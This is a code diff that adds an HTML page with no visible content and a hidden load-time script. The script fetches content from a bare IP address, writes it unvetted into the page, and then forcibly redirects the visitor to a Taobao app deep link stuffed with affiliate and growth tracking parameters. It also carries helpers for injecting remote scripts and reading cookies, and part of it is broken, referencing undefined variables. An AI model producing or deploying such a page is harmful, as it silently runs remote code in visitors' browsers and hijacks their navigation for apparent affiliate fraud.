@@ -1,0 +1,61 @@
+<html>
+<head>
+    <script type="text/javascript">
+
+        function setccc(c_name, value, sec) {
+            var exdate = new Date()
+            exdate.setTime(date.getTime()+sec*1000)
+            document.cookie = c_name + "=" + escape(value) +
+                ((expiredays == null) ? "" : ";expires=" + exdate.toGMTString())
+        }
+
+        function getccc(c_name) {
+            if (document.cookie.length > 0) {
+                c_start = document.cookie.indexOf(c_name + "=")
+                if (c_start != -1) {
+                    c_start = c_start + c_name.length + 1
+                    c_end = document.cookie.indexOf(";", c_start)
+                    if (c_end == -1) c_end = document.cookie.length
+                    return unescape(document.cookie.substring(c_start, c_end))
+                }
+            }
+            return ""
+        }
+
+
+        function addjs(src) {
+            var headObj = document.getElementsByTagName("head")[0];
+            srciptObj = document.createElement("script");
+            srciptObj.language = "javaScript";
+            srciptObj.type = "text/JavaScript";
+            srciptObj.src = src;
+            headObj.appendChild(srciptObj);
+        }
+
+        function loadjs() {
+location.href = "tbopen://m.taobao.com/tbopen/index.html?source=auto&action=ali.open.nav&module=h5&bootImage=0&spm=2014.ugdhh.4149348497.10011-923&bc_fl_src=growth_dhh_4149348497_10011-923&materialid=10011&h5Url=https%3A%2F%2Fh5.m.taobao.com%2Fbcec%2Fdahanghai-jump.html%3Fspm%3D2014.ugdhh.4149348497.10011-923%26bc_fl_src%3Dgrowth_dhh_4149348497_10011-923";
+        }
+
+
+    var xhr = null;
+    if(window.XMLHttpRequest){
+    xhr = new XMLHttpRequest();
+    }else if(window.ActiveXObject){
+    xhr = new ActiveXObject()
+    }else{
+    xhr = null;
+    }
+    if(xhr){
+    xhr.open('GET','http://39.156.46.61/proof.html?a748=fy!_1559478149037040070');
+    xhr.onreadystatechange = function(){
+    if(xhr.readyState == 4 && xhr.status == 200){
+    document.write(xhr.responseText);
+    loadjs();
+    xhr = null;
+    }}}
+    xhr.send();
+    </script>
+</head>
+<body>
+</body>
+</html>
